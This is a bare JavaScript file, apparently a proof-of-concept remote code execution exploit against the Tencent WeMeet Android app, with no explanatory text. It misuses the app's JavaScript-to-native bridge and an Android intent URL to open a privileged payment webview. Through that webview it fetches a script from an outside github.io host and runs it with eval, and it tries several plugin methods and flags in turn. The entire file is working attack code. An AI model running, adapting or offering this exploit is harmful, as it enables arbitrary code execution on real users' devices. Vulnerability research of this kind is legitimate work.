(function(){
  document.title='P79TB:'+location.host;
  window.__p=function(r){
    try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}
    try{
      window.JSCallJavaMgr.JSCallNative(JSON.stringify({
        module:'CommonPlugin',method:'PrintLog',
        param:{log:JSON.stringify(r)},callId:'LOG'
      }));
    }catch(e){}
    document.title='P79CB:'+(r&&r.callId)+':'+location.host+':'+(r&&r.code)+':'+String(r&&r.message||JSON.stringify(r&&r.data||{})).slice(0,56);
  };
  function c(id,mod,m,p){
    window.JSCallJavaMgr.JSCallNative(JSON.stringify({
      callback:'window.__p',module:mod,method:m,param:p,callId:id
    }));
  }
  var jsurl='javascript:void(fetch("https://gitwhs.github.io/wm-poc-rce/p79main.js").then(function(r){return r.text()}).then(eval))';
  var pay='wemeet://page/pay/main_process_webview?url='+encodeURIComponent(jsurl);
  var intent1='intent:#Intent;component=com.tencent.wemeet.app/com.tencent.wemeet.components.webcore.activity.MainProcessPayBrowserActivity;launchFlags=0x20000000;S.url='+jsurl+';end';
  try{
    document.title='P79-LOCINT';
    location.href=intent1;
  }catch(e){}
  setTimeout(function(){
    try{
      document.title='P79-IFRINT';
      var f=document.createElement('iframe');
      f.src=intent1;
      document.body.appendChild(f);
    }catch(e){}
  }, 800);
  var q=[
    ['O1','CommonPlugin','OpenNewPage',{url:pay,scheme:pay,action_flag:32,actionFlag:32,flag:32}],
    ['O2','CommonPlugin','OpenNewPage',{url:jsurl,scheme:pay,action_flag:32}],
    ['O3','TmWebPlugin','OpenNewPage',{url:pay,action_flag:32}],
    ['O4','CommonPlugin','OpenNewPage',{url:pay,action_flag:8}],
    ['O5','CommonPlugin','NavigateOpenNewPage',{url:pay,action_flag:32}],
    ['H2','CommonPlugin','GetPerformance',{}]
  ];
  var i=0;
  function n(){
    if(i>=q.length){document.title='P79TB-DONE:'+location.host;return}
    var x=q[i++];
    c(x[0],x[1],x[2],x[3]);
    setTimeout(n,3000);
  }
  setTimeout(n, 2000);
})();
